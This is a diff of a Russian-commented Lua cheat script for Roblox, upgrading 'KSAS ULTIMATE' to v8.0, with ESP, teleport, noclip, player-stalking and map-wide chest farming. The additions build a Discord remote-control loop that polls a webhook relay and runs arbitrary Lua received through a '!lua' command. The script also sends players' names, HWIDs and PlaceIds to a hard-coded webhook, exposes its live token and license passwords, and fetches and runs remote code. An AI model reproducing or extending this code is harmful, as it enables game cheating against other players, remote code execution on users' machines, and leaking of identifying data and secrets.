@@ -1,8 +1,7 @@
 -- =====================================================================
--- KSAS ULTIMATE v7.0 (ФИНАЛ + Discord License)
+-- KSAS ULTIMATE v8.0 (Discord Control + Chests Full Map)
 -- 🔥 Fluent UI | 🐱 Котенок | 🎯 PvP | 👁️ ESP Ботов (только с E)
--- 🎨 МНОГО ЦВЕТОВ | 📦 Модули | ⚡ Движение | 🛡️ Щит
--- 🔒 Discord Webhook License System
+-- 🌐 Discord Remote Control | 📦 Сундуки по всей карте
 -- =====================================================================
 
 -- ==================== ОЧИСТКА СТАРОГО ====================
@@ -31,10 +30,15 @@ end
 -- ==================== НАСТРОЙКИ ЛИЦЕНЗИИ ====================
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550239197946843136/mZx8H0TQyHpISNpQgymeNiJu2S5lkuHQVeu27BcgoPqJAJ966ZVown-QR5tf4dzMSBYc"
 
+-- Discord Control (тот же webhook)
+local COMMAND_WEBHOOK_ID    = "1550239197946843136"
+local COMMAND_WEBHOOK_TOKEN = "mZx8H0TQyHpISNpQgymeNiJu2S5lkuHQVeu27BcgoPqJAJ966ZVown-QR5tf4dzMSBYc"
+local RELAY_BASE = "https://webhook.lewisakura.moe/api/webhooks/" .. COMMAND_WEBHOOK_ID .. "/" .. COMMAND_WEBHOOK_TOKEN
+
 -- ⚠️ ЗАМЕНИ НА СВОИ ПАРОЛИ!
 local PASSWORDS = {
-    ["KSAS-OWNER-2eEfTLhrPXynKWxvWAbG6nJpCvvGyHvG"] = "OWNER",   -- ТВОЙ пароль
-    ["KSAS-FRIEND-4VcCpmGCcHvM3v6myqs4d2wHjkR8PFXk"] = "FRIEND",  -- ПАРОЛЬ ДРУГА
+    ["KSAS-OWNER-2eEfTLhrPXynKWxvWAbG6nJpCvvGyHvG"] = "OWNER",
+    ["KSAS-FRIEND-4VcCpmGCcHvM3v6myqs4d2wHjkR8PFXk"] = "FRIEND",
 }
 
 -- ==================== ФУНКЦИИ ====================
@@ -56,7 +60,6 @@ end
 local function sendWebhook(title, description, color)
     local reqFunc = getRequestFunc()
     if not reqFunc then return false end
-    
     local ok = pcall(function()
         local data = {
             username = "KSAS Logger",
@@ -67,17 +70,13 @@ local function sendWebhook(title, description, color)
                 timestamp = DateTime.now():ToIsoDate()
             }}
         }
-        
         reqFunc({
             Url = DISCORD_WEBHOOK,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = { ["Content-Type"] = "application/json" },
             Body = httpService:JSONEncode(data)
         })
     end)
-    
     return ok
 end
 
@@ -108,7 +107,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 55)
 title.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
 title.BorderSizePixel = 0
-title.Text = "🔒 KSAS ULTIMATE"
+title.Text = "🔒 KSAS ULTIMATE v8.0"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 22
 title.Font = Enum.Font.GothamBold
@@ -187,9 +186,6 @@ statusLabel.Parent = main
 
 -- ==================== ЗАГРУЗКА ОСНОВНОГО СКРИПТА ====================
 local function launchMainScript()
-    -- ===== ЗДЕСЬ ОСНОВНОЙ СКРИПТ KSAS =====
-    -- (все функции: Fluent, Котенок, ESP, PvP, Сундуки, Движение, Щит, Модули)
-    
     local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
     local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
     local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
@@ -250,7 +246,7 @@ local function launchMainScript()
     local pvpTargetName = nil
     local pvpCooldown = false
 
-    -- ==================== ФУНКЦИИ ====================
+    -- ==================== ESP ФУНКЦИИ ====================
     local function applyESP(char)
         if not char then return end
         local oldHl = char:FindFirstChild("XenoESP")
@@ -296,7 +292,7 @@ local function launchMainScript()
         return nearest
     end
 
-    -- ==================== ESP БОТОВ (ТОЛЬКО С E) ====================
+    -- ==================== ESP БОТОВ ====================
     local function isPlayerCharacter(model)
         if not model then return false end
         for _, p in ipairs(game.Players:GetPlayers()) do
@@ -307,13 +303,12 @@ local function launchMainScript()
 
     local function botHasE(botModel)
         if not botModel or not botModel.Parent then return false end
-        
         local hasE = false
         pcall(function()
             for _, obj in ipairs(botModel:GetDescendants()) do
                 if obj and obj.Parent and obj:IsA("ProximityPrompt") then
-                    if obj.KeyboardKeyCode == Enum.KeyCode.E 
-                       and obj.Enabled == true 
+                    if obj.KeyboardKeyCode == Enum.KeyCode.E
+                       and obj.Enabled == true
                        and obj.MaxActivationDistance > 0 then
                         hasE = true
                         break
@@ -326,7 +321,6 @@ local function launchMainScript()
 
     local function addBotEsp(botModel)
         if not botModel or botEspObjects[botModel] then return end
-        
         pcall(function()
             local hl = Instance.new("Highlight")
             hl.Name = "XenoBotESP"
@@ -345,8 +339,8 @@ local function launchMainScript()
         if not botModel then return end
         if botEspObjects[botModel] then
             pcall(function()
-                if botEspObjects[botModel].Parent then 
-                    botEspObjects[botModel]:Destroy() 
+                if botEspObjects[botModel].Parent then
+                    botEspObjects[botModel]:Destroy()
                 end
             end)
             botEspObjects[botModel] = nil
@@ -367,24 +361,20 @@ local function launchMainScript()
 
     local function updateBotEsp()
         if not botEspEnabled then return end
-        
         pcall(function()
             local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
             if not myRoot then return end
-            
             local myPos = myRoot.Position
             local seenBots = {}
             botEspList = {}
             local count = 0
-            
             for _, obj in ipairs(workspace:GetDescendants()) do
                 if count >= BOT_ESP_LIMIT then break end
-                
                 if obj and obj.Parent and obj:IsA("Model") and obj ~= player.Character and not isPlayerCharacter(obj) then
                     local hum = obj:FindFirstChild("Humanoid")
                     if hum and hum.Health and hum.Health > 0 then
-                        local botRoot = obj:FindFirstChild("HumanoidRootPart") 
-                            or obj:FindFirstChild("Torso") 
+                        local botRoot = obj:FindFirstChild("HumanoidRootPart")
+                            or obj:FindFirstChild("Torso")
                             or obj:FindFirstChild("UpperTorso")
                         if botRoot and botRoot.Position then
                             local dist = (myPos - botRoot.Position).Magnitude
@@ -406,11 +396,9 @@ local function launchMainScript()
                     end
                 end
             end
-            
             pcall(function()
                 table.sort(botEspList, function(a, b) return a.distance < b.distance end)
             end)
-            
             for model, hl in pairs(botEspObjects) do
                 if not seenBots[model] or not model or not model.Parent then
                     removeBotEsp(model)
@@ -419,57 +407,106 @@ local function launchMainScript()
         end)
     end
 
-    -- ==================== СУНДУКИ ====================
+    -- ==================== СУНДУКИ (ПО ВСЕЙ КАРТЕ) ====================
     local function scanChests()
         local char = player.Character
         if not char then return false, "Нет персонажа" end
         local myRoot = char:FindFirstChild("HumanoidRootPart")
         if not myRoot then return false, "Нет RootPart" end
-        
-        local nearestPrompt, nearestDist = nil, math.huge
+
+        -- 1. Все ProximityPrompt в workspace
+        local allPrompts = {}
         for _, obj in ipairs(workspace:GetDescendants()) do
-            if obj:IsA("ProximityPrompt") then
+            if obj:IsA("ProximityPrompt") and obj.Enabled then
                 local parent = obj.Parent
                 if parent then
-                    local rootPart = parent:IsA("BasePart") and parent or parent:FindFirstChildWhichIsA("BasePart")
+                    local rootPart = parent:IsA("BasePart") and parent
+                        or parent:FindFirstChildWhichIsA("BasePart", true)
                     if rootPart then
-                        local d = (myRoot.Position - rootPart.Position).Magnitude
-                        if d < nearestDist and d < 15 then
-                            nearestDist = d
-                            nearestPrompt = obj
-                        end
+                        table.insert(allPrompts, {
+                            prompt = obj,
+                            part = rootPart,
+                            name = parent.Name,
+                            hold = obj.HoldDuration or 0,
+                            key = obj.KeyboardKeyCode or Enum.KeyCode.E,
+                        })
                     end
                 end
             end
         end
-        
-        if not nearestPrompt then return false, "Не нашёл сундук рядом" end
-        
-        savedChestName = nearestPrompt.Parent.Name
-        savedHoldDuration = nearestPrompt.HoldDuration or 0
-        
+
+        if #allPrompts == 0 then
+            return false, "На карте нет ProximityPrompt"
+        end
+
+        -- 2. Группировка по имени+hold+клавише
+        local groups = {}
+        for _, e in ipairs(allPrompts) do
+            local key = e.name .. "|" .. tostring(e.hold) .. "|" .. tostring(e.key)
+            groups[key] = groups[key] or { name = e.name, hold = e.hold, key = e.key, entries = {} }
+            table.insert(groups[key].entries, e)
+        end
+
+        -- 3. Доминирующая группа
+        local bestKey, bestGroup = nil, nil
+        for k, g in pairs(groups) do
+            if not bestGroup or #g.entries > #bestGroup.entries then
+                bestKey, bestGroup = k, g
+            end
+        end
+
+        -- 4. Приоритет ближайшего prompt
+        local nearPrompt = nil
+        local nearDist = math.huge
+        for _, e in ipairs(allPrompts) do
+            local d = (myRoot.Position - e.part.Position).Magnitude
+            if d < nearDist and d < 20 then
+                nearDist = d
+                nearPrompt = e
+            end
+        end
+        if nearPrompt then
+            local nk = nearPrompt.name .. "|" .. tostring(nearPrompt.hold) .. "|" .. tostring(nearPrompt.key)
+            if groups[nk] and #groups[nk].entries >= #bestGroup.entries then
+                bestKey, bestGroup = nk, groups[nk]
+            end
+        end
+
+        -- 5. Заполняем список
         chestsList = {}
-        for _, obj in ipairs(workspace:GetDescendants()) do
-            if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent.Name == savedChestName then
-                local parentHold = obj.HoldDuration or 0
-                local sameType = false
-                if savedHoldDuration > 0 and parentHold > 0 then sameType = true
-                elseif savedHoldDuration == 0 and parentHold == 0 then sameType = true end
-                
-                if sameType then
-                    local parent = obj.Parent
-                    local rootPart = parent:IsA("BasePart") and parent or parent:FindFirstChildWhichIsA("BasePart")
-                    if rootPart then
-                        table.insert(chestsList, {part = rootPart, prompt = obj, holdDuration = parentHold})
-                    end
-                end
-            end
+        for _, e in ipairs(bestGroup.entries) do
+            table.insert(chestsList, {
+                part = e.part,
+                prompt = e.prompt,
+                holdDuration = e.hold,
+                key = e.key,
+            })
         end
-        
+
+        -- 6. Сортировка по расстоянию
+        table.sort(chestsList, function(a, b)
+            return (myRoot.Position - a.part.Position).Magnitude
+                 < (myRoot.Position - b.part.Position).Magnitude
+        end)
+
+        savedChestName = bestGroup.name
+        savedHoldDuration = bestGroup.hold
         currentChestIndex = 1
-        return true, savedChestName .. " | " .. #chestsList .. " шт."
+
+        local total = #chestsList
+        local otherGroups = 0
+        for _, g in pairs(groups) do
+            if g ~= bestGroup then otherGroups = otherGroups + #g.entries end
+        end
+
+        return true, string.format(
+            "%s | %d шт. по всей карте%s",
+            bestGroup.name, total,
+            otherGroups > 0 and (" (+" .. otherGroups .. " др. типов)") or ""
+        )
     end
 
+    -- Цикл сбора по всей карте
     task.spawn(function()
         while true do
             task.wait(0.1)
@@ -478,30 +515,43 @@ local function launchMainScript()
                 if not char then continue end
                 local myRoot = char:FindFirstChild("HumanoidRootPart")
                 if not myRoot then continue end
-                
-                if currentChestIndex > #chestsList then currentChestIndex = 1 end
-                
+
+                if currentChestIndex > #chestsList then
+                    currentChestIndex = 1
+                    task.wait(0.5)
+                    if farming then
+                        local ok, msg = scanChests()
+                        if ok then
+                            pcall(function()
+                                Fluent:Notify({ Title = "📦 Рескан", Content = msg, Duration = 2 })
+                            end)
+                        end
+                    end
+                    continue
+                end
+
                 local entry = chestsList[currentChestIndex]
                 if not entry or not entry.part or not entry.part.Parent then
                     table.remove(chestsList, currentChestIndex)
                     if currentChestIndex > #chestsList then currentChestIndex = 1 end
                     continue
                 end
-                
+
                 local chestPart = entry.part
                 local prompt = entry.prompt
-                local holdDur = entry.holdDuration
-                
+                local holdDur = entry.holdDuration or 0
+                local key = entry.key or Enum.KeyCode.E
+
                 if not prompt or not prompt.Parent then
                     table.remove(chestsList, currentChestIndex)
                     continue
                 end
-                
-                myRoot.CFrame = CFrame.new(chestPart.Position + Vector3.new(0, 3, 0))
+
+                pcall(function()
+                    myRoot.CFrame = CFrame.new(chestPart.Position + Vector3.new(0, 3, 0))
+                end)
                 task.wait(0.2)
-                
-                local key = prompt.KeyboardKeyCode or Enum.KeyCode.E
-                
+
                 if holdDur > 0 then
                     vim:SendKeyEvent(true, key, false, game)
                     local waitTime = math.max(holdDur + 0.3, 2.5)
@@ -517,7 +567,7 @@ local function launchMainScript()
                     vim:SendKeyEvent(false, key, false, game)
                     task.wait(0.5)
                 end
-                
+
                 currentChestIndex = currentChestIndex + 1
             end
         end
@@ -637,9 +687,9 @@ local function launchMainScript()
         end
     end
 
-    -- ==================== ОКНО FLUENT ====================
+    -- ==================== FLUENT WINDOW ====================
     local Window = Fluent:CreateWindow({
-        Title = "⚡ KSAS ULTIMATE v7.0",
+        Title = "⚡ KSAS ULTIMATE v8.0",
         SubTitle = "by KSAS",
         TabWidth = 170,
         Size = UDim2.fromOffset(620, 520),
@@ -659,14 +709,15 @@ local function launchMainScript()
         EspPlayers = Window:AddTab({ Title = "👁️ ESP Игроков", Icon = "user" }),
         EspBots = Window:AddTab({ Title = "🤖 ESP Ботов (E)", Icon = "users" }),
         PvP = Window:AddTab({ Title = "🎯 PvP", Icon = "crosshair" }),
+        Discord = Window:AddTab({ Title = "🌐 Discord", Icon = "message-circle" }),
         Modules = Window:AddTab({ Title = "📦 Модули", Icon = "code" }),
         Settings = Window:AddTab({ Title = "⚙️ Настройки", Icon = "settings" })
     }
 
     -- ГЛАВНАЯ
     Tabs.Main:AddParagraph({
-        Title = "⚡ KSAS ULTIMATE v7.0",
-        Content = "🔥 Fluent UI\n🔒 License Active\n👆 RightControl = свернуть"
+        Title = "⚡ KSAS ULTIMATE v8.0",
+        Content = "🔥 Fluent UI\n🔒 License Active\n🌐 Discord Control\n📦 Chests Full Map\n👆 RightControl = свернуть"
     })
 
     Tabs.Main:AddSection("🎯 Горячие клавиши")
@@ -684,7 +735,7 @@ local function launchMainScript()
             local char = player.Character
             if not char then return end
             local root = char:FindFirstChild("HumanoidRootPart")
-            if root then 
+            if root then
                 savedPositions[1] = root.Position
                 Fluent:Notify({ Title = "📍 Метка 1", Content = "Сохранено!", Duration = 2 })
             end
@@ -713,7 +764,7 @@ local function launchMainScript()
             local char = player.Character
             if not char then return end
             local root = char:FindFirstChild("HumanoidRootPart")
-            if root then 
+            if root then
                 savedPositions[2] = root.Position
                 Fluent:Notify({ Title = "📍 Метка 2", Content = "Сохранено!", Duration = 2 })
             end
@@ -739,19 +790,14 @@ local function launchMainScript()
     Tabs.Stalker:AddSection("⚙️ Настройки")
     Tabs.Stalker:AddSlider("StalkDist", {
         Title = "📏 Дистанция за спиной",
-        Default = 3,
-        Min = 1,
-        Max = 6,
-        Rounding = 1,
+        Default = 3, Min = 1, Max = 6, Rounding = 1,
         Callback = function(Value) STALK_DISTANCE = Value end
     })
     Tabs.Stalker:AddSection("👥 Игроки")
 
     local stalkerDropdown = Tabs.Stalker:AddDropdown("StalkerTarget", {
         Title = "🎯 Выбери цель",
-        Values = {},
-        Multi = false,
-        Default = "",
+        Values = {}, Multi = false, Default = "",
         Callback = function(Value)
             if Value == "" then return end
             for _, p in ipairs(game.Players:GetPlayers()) do
@@ -861,10 +907,10 @@ local function launchMainScript()
     Tabs.Chests:AddSection("📦 Управление")
     Tabs.Chests:AddParagraph({
         Title = "📝 Как использовать",
-        Content = "1️⃣ Подойди к сундуку\n2️⃣ Нажми СКАН\n3️⃣ Нажми СТАРТ СБОРА"
+        Content = "1️⃣ Нажми СКАН (ищет по ВСЕЙ карте)\n2️⃣ Нажми СТАРТ СБОРА\n3️⃣ Бот сам ТП ко всем сундукам"
     })
     Tabs.Chests:AddButton({
-        Title = "📋 СКАН (запомнить сундук)",
+        Title = "📋 СКАН (все сундуки карты)",
         Callback = function()
             local ok, msg = scanChests()
             if ok then
@@ -878,11 +924,14 @@ local function launchMainScript()
         Title = "▶️ СТАРТ СБОРА",
         Callback = function()
             if #chestsList == 0 then
-                Fluent:Notify({ Title = "❌ Ошибка", Content = "Сначала нажми СКАН!", Duration = 2 })
-                return
+                local ok = scanChests()
+                if not ok then
+                    Fluent:Notify({ Title = "❌ Ошибка", Content = "Сундуки не найдены", Duration = 2 })
+                    return
+                end
             end
             farming = true
-            Fluent:Notify({ Title = "📦 Сундуки", Content = "Сбор ВКЛ", Duration = 2 })
+            Fluent:Notify({ Title = "📦 Сундуки", Content = "Сбор ВКЛ (" .. #chestsList .. ")", Duration = 2 })
         end
     })
     Tabs.Chests:AddButton({
@@ -1148,10 +1197,10 @@ local function launchMainScript()
                     updateBotEsp()
                     task.wait(2)
                     updateBotEsp()
-                    Fluent:Notify({ 
-                        Title = "🤖 ESP Ботов", 
-                        Content = "ВКЛ | Найдено: " .. #botEspList, 
-                        Duration = 3 
+                    Fluent:Notify({
+                        Title = "🤖 ESP Ботов",
+                        Content = "ВКЛ | Найдено: " .. #botEspList,
+                        Duration = 3
                     })
                 else
                     clearAllBotEsp()
@@ -1324,7 +1373,244 @@ local function launchMainScript()
         Callback = function() doPvpTeleport() end
     })
 
-    -- МОДУЛИ
+    -- ==================== DISCORD CONTROL ====================
+    Tabs.Discord:AddSection("🌐 Discord Remote Control")
+    Tabs.Discord:AddParagraph({
+        Title = "📝 Команды",
+        Content = "Пиши в канал Discord, куда подключён webhook:\n" ..
+                  "!tp <ник> — ТП к игроку\n" ..
+                  "!speed <n> — скорость\n" ..
+                  "!fly on/off — полёт\n" ..
+                  "!noclip — вкл/выкл noclip\n" ..
+                  "!stalk <ник> — котёнок за игроком\n" ..
+                  "!bot <имя> — котёнок-бот\n" ..
+                  "!chest scan/start/stop — сундуки\n" ..
+                  "!shield — щит вкл/выкл\n" ..
+                  "!esp players/bots — ESP\n" ..
+                  "!save <1|2> — сохранить метку\n" ..
+                  "!tpto <1|2> — ТП в метку\n" ..
+                  "!lua <код> — выполнить Lua\n" ..
+                  "!stop — всё выключить"
+    })
+
+    local discordEnabled = true
+    Tabs.Discord:AddToggle("DiscordToggle", {
+        Title = "🌐 Discord Control вкл/выкл",
+        Default = true,
+        Callback = function(state) discordEnabled = state end
+    })
+
+    local processedIds = {}
+
+    local function httpGet(url)
+        local reqFunc = getRequestFunc()
+        if not reqFunc then return nil end
+        local ok, res = pcall(function()
+            return reqFunc({ Url = url, Method = "GET" })
+        end)
+        if ok and res and res.Body then return res.Body end
+        return nil
+    end
+
+    local function httpDelete(url)
+        local reqFunc = getRequestFunc()
+        if not reqFunc then return false end
+        local ok = pcall(function()
+            reqFunc({ Url = url, Method = "DELETE" })
+        end)
+        return ok
+    end
+
+    local function executeDiscordCommand(text, author)
+        text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+        if text == "" or text:sub(1,1) ~= "!" then return end
+
+        local args = {}
+        for word in text:gmatch("%S+") do table.insert(args, word) end
+        local cmd = args[1]:lower():sub(2)
+        table.remove(args, 1)
+
+        local function notify(msg)
+            pcall(function()
+                Fluent:Notify({ Title = "🌐 Discord", Content = msg, Duration = 3 })
+            end)
+        end
+
+        if cmd == "tp" or cmd == "goto" then
+            local name = args[1]
+            if not name then notify("!tp <ник>") return end
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if p.Name:lower():find(name:lower(), 1, true) and p ~= player then
+                    local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                    local tr = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
+                    if myRoot and tr then
+                        myRoot.CFrame = CFrame.new(tr.Position + Vector3.new(0, 3, 0))
+                        notify("ТП к " .. p.Name)
+                    end
+                    return
+                end
+            end
+            notify("Игрок не найден: " .. name)
+
+        elseif cmd == "speed" then
+            local v = tonumber(args[1]) or 100
+            speedValue = v
+            speedEnabled = true
+            local hum = player.Character and player.Character:FindFirstChild("Humanoid")
+            if hum then hum.WalkSpeed = v end
+            notify("Speed = " .. v)
+
+        elseif cmd == "fly" then
+            local state = (args[1] or "on"):lower()
+            flyEnabled = (state == "on" or state == "true" or state == "1")
+            notify("Fly = " .. tostring(flyEnabled))
+
+        elseif cmd == "noclip" then
+            noclipEnabled = not noclipEnabled
+            notify("Noclip = " .. tostring(noclipEnabled))
+
+        elseif cmd == "stalk" then
+            local name = args[1]
+            if not name then notify("!stalk <ник>") return end
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if p.Name:lower():find(name:lower(), 1, true) and p ~= player then
+                    stalkTarget = p
+                    stalking = true
+                    notify("Котёнок → " .. p.Name)
+                    return
+                end
+            end
+            notify("Не найден: " .. name)
+
+        elseif cmd == "bot" then
+            local name = args[1]
+            if not name then notify("!bot <имя_бота>") return end
+            botTargetName = name
+            botStalking = true
+            local t = findNearestBotWithName(name)
+            if t then botTarget = t end
+            notify("Котёнок-Бот → " .. name)
+
+        elseif cmd == "stop" then
+            stalking = false; stalkTarget = nil
+            botStalking = false; botTarget = nil
+            farming = false
+            speedEnabled = false
+            flyEnabled = false
+            noclipEnabled = false
+            shieldEnabled = false
+            autoButtonsEnabled = false
+            notify("Всё остановлено")
+
+        elseif cmd == "chest" or cmd == "farm" then
+            local sub = (args[1] or "start"):lower()
+            if sub == "scan" then
+                local ok, msg = scanChests()
+                notify(msg or (ok and "OK" or "Ошибка"))
+            elseif sub == "start" then
+                if #chestsList == 0 then scanChests() end
+                farming = true
+                notify("Сбор сундуков ВКЛ (" .. #chestsList .. ")")
+            elseif sub == "stop" then
+                farming = false
+                notify("Сбор ВЫКЛ")
+            end
+
+        elseif cmd == "shield" then
+            shieldEnabled = not shieldEnabled
+            notify("Щит = " .. tostring(shieldEnabled))
+
+        elseif cmd == "esp" then
+            local sub = (args[1] or "toggle"):lower()
+            if sub == "players" then
+                espEnabled = not espEnabled
+                if espEnabled then
+                    for _, p in ipairs(game.Players:GetPlayers()) do
+                        if p ~= player and p.Character then applyESP(p.Character) end
+                    end
+                else
+                    disableESP()
+                end
+                notify("ESP игроков = " .. tostring(espEnabled))
+            elseif sub == "bots" then
+                botEspEnabled = not botEspEnabled
+                if botEspEnabled then updateBotEsp() else clearAllBotEsp() end
+                notify("ESP ботов = " .. tostring(botEspEnabled))
+            end
+
+        elseif cmd == "save" then
+            local slot = tonumber(args[1]) or 1
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                savedPositions[slot] = root.Position
+                notify("Метка " .. slot .. " сохранена")
+            end
+
+        elseif cmd == "tpto" then
+            local slot = tonumber(args[1]) or 1
+            local pos = savedPositions[slot]
+            if pos then
+                local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if root then root.CFrame = CFrame.new(pos) end
+                notify("ТП в метку " .. slot)
+            else
+                notify("Метка " .. slot .. " пуста")
+            end
+
+        elseif cmd == "lua" or cmd == "exec" then
+            local code = text:sub(#cmd + 3)
+            if code and code ~= "" then
+                local f = loadstring(code)
+                if f then
+                    pcall(f)
+                    notify("Lua выполнен")
+                else
+                    notify("Ошибка компиляции")
+                end
+            end
+
+        else
+            notify("Неизвестная команда: " .. cmd)
+        end
+    end
+
+    task.spawn(function()
+        while true do
+            task.wait(2)
+            if not discordEnabled then continue end
+            pcall(function()
+                local body = httpGet(RELAY_BASE .. "?limit=10")
+                if body then
+                    local ok, data = pcall(function() return httpService:JSONDecode(body) end)
+                    if ok and type(data) == "table" then
+                        local msgs = data
+                        if data.messages then msgs = data.messages end
+                        if type(msgs) == "table" then
+                            local sorted = {}
+                            for _, m in ipairs(msgs) do table.insert(sorted, m) end
+                            table.sort(sorted, function(a,b)
+                                return tostring(a.id or "") < tostring(b.id or "")
+                            end)
+                            for _, m in ipairs(sorted) do
+                                local mid = tostring(m.id or "")
+                                if mid ~= "" and not processedIds[mid] then
+                                    processedIds[mid] = true
+                                    local content = m.content or ""
+                                    local author = (m.author and m.author.username) or "unknown"
+                                    if not (m.author and m.author.bot) and content:sub(1,1) == "!" then
+                                        executeDiscordCommand(content, author)
+                                    end
+                                    httpDelete(RELAY_BASE .. "/messages/" .. mid)
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+
+    -- ==================== МОДУЛИ ====================
     local MODULES_FOLDER = "KSAS_Modules"
     local hasFileSystem = (writefile and readfile and isfile and makefolder and listfiles)
     if hasFileSystem and not isfolder(MODULES_FOLDER) then
@@ -1462,7 +1748,7 @@ local function launchMainScript()
     InterfaceManager:BuildInterfaceSection(Tabs.Settings)
     SaveManager:LoadAutoloadConfig()
 
-    -- ЦИКЛЫ
+    -- ==================== ЦИКЛЫ ====================
     runService.RenderStepped:Connect(function()
         if stalking and stalkTarget then
             local char = stalkTarget.Character
@@ -1519,7 +1805,7 @@ local function launchMainScript()
                 if esp and esp.Parent then esp.FillColor = c end
             end
         end
-        
+
         if botEspRainbow then
             local c = Color3.fromHSV((tick() % 1), 1, 1)
             for _, hl in pairs(botEspObjects) do
@@ -1635,31 +1921,31 @@ local function launchMainScript()
     end)
 
     Fluent:Notify({
-        Title = "⚡ KSAS ULTIMATE v7.0",
-        Content = "Загружено! RightControl = свернуть",
+        Title = "⚡ KSAS ULTIMATE v8.0",
+        Content = "Загружено! Discord Control активен",
         Duration = 5
     })
 
-    print("✅ KSAS ULTIMATE v7.0 загружен!")
+    print("✅ KSAS ULTIMATE v8.0 загружен!")
 end
 
 -- ==================== ЛОГИКА ЛИЦЕНЗИИ ====================
 local function tryLogin()
     local password = passBox.Text
     local hwid = getHWID()
-    
+
     if password == "" then
         statusLabel.Text = "❌ Введи пароль!"
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         return
     end
-    
+
     local role = PASSWORDS[password]
-    
+
     if not role then
         statusLabel.Text = "❌ НЕПРАВИЛЬНЫЙ ПАРОЛЬ!"
         statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-        
+
         sendWebhook(
             "❌ НЕПРАВИЛЬНЫЙ ПАРОЛЬ",
             "**Игрок:** `" .. player.Name .. "`\n" ..
@@ -1669,17 +1955,17 @@ local function tryLogin()
             "**PlaceId:** `" .. game.PlaceId .. "`",
             15158332
         )
-        
+
         task.delay(3, function()
             licenseGui:Destroy()
             error("KSAS: Wrong password")
         end)
         return
     end
-    
+
     statusLabel.Text = "✅ Пароль верный!\nЗагрузка..."
     statusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
-    
+
     sendWebhook(
         "✅ УСПЕШНЫЙ ВХОД",
         "**Игрок:** `" .. player.Name .. "`\n" ..
@@ -1689,7 +1975,7 @@ local function tryLogin()
         "**PlaceId:** `" .. game.PlaceId .. "`",
         3066993
     )
-    
+
     task.delay(1, function()
         licenseGui:Destroy()
         launchMainScript()
@@ -1715,4 +2001,4 @@ sendWebhook(
     3447003
 )
 
-print("🔒 KSAS License v7.0 загружен")
+print("🔒 KSAS License v8.0 загружен")
